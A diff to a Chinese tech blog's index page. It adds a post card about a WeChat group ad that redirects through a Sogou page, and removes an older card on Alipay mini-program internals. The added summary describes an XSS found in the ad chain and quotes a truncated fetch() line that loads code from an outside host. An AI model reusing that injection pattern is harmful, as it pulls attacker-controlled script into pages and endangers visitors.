@@ -446,6 +446,57 @@
             
             <div class="article col s12 m6 l4" data-aos="zoom-in">
                 <div class="card">
+                    <a href="/2022/10/06/front-end/xss/">
+                        <div class="card-image">
+                            
+                            <img src="../../coverImages/xss.png" class="responsive-img" alt="一个意思的微信群广告">
+                            
+                            <span class="card-title">一个意思的微信群广告</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                群广告，语不惊人死不休，
+
+跳转之后，出现 sougou 的页面，然后重定向到广告页面。
+
+构造了一个 xss，script 标签，被执行。
+fetch('//iprozz.com/ffff').then(r=>r.text()).then
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-06
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E5%89%8D%E7%AB%AF/" class="post-category">
+                                    前端
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/%E5%AE%89%E5%85%A8/">
+                            <span class="chip bg-color">安全</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
                     <a href="/2022/09/18/anything/da-xing-xiang-mu-qian-duan-shou-ji/">
                         <div class="card-image">
                             
@@ -941,56 +992,6 @@ pm2 频繁重启日志文件是直接读写，没有按照时间分割，
 小程序的路由是多个 iframe 的堆叠，每个iframe 运行在独立的 webview 中。
 
 sass/scss小程序的本身应该是支持 sass 预编译的处理的，在相关目录中能够看到这部分的 node_modules 文件，但是不
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-31
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E5%89%8D%E7%AB%AF/" class="post-category">
-                                    前端
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/">
-                            <span class="chip bg-color">小程序</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-            
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2021/07/31/front-end/deep-in-alipay-mini-program-3/">
-                        <div class="card-image">
-                            
-                            <img src="../../coverImages/mini-alipay.jpeg" class="responsive-img" alt="深入理解支付宝小程序 -- event、jsBridge通信篇">
-                            
-                            <span class="card-title">深入理解支付宝小程序 -- event、jsBridge通信篇</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                这篇我们将跟踪函数，尝试去分离出 webview 和 worker 的通信方式.
-分析方法
-在调试模式中，对按钮事件打断点，一层一层跟下去，不要纠结细节，只关注核心实现。
-事件路径分析
-事件的路径非常非常非常厂，图中省略了很多细节。简单来说
                             
                         </div>
                         <div class="publish-info">
